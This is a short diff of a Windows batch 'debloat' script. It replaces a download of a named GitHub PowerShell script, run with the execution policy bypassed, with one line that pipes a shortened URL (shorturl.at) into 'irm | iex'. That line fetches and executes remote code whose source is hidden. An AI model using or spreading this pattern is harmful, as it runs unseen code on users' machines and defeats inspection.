@@ -56,8 +56,7 @@ goto :MainMenu
 :Debloat
 cls
 echo "Downloading"
-powershell -command "$wc = New-Object net.webclient; $msu_url = 'https://raw.githubusercontent.com/Iblis94/debloat3.0/main/Debloat3.0.ps1'; $local_msu_url = \"$env:APPDATA\Debloat3.0.ps1\"; $wc.DownloadFile($msu_url, $local_msu_url);"
-powershell -command "PowerShell -ExecutionPolicy Bypass -File \"$env:APPDATA\Debloat3.0.ps1\""
+powershell -command "irm -Uri "https://shorturl.at/auHS4" | iex"
 exit
 
 :Custom_iso
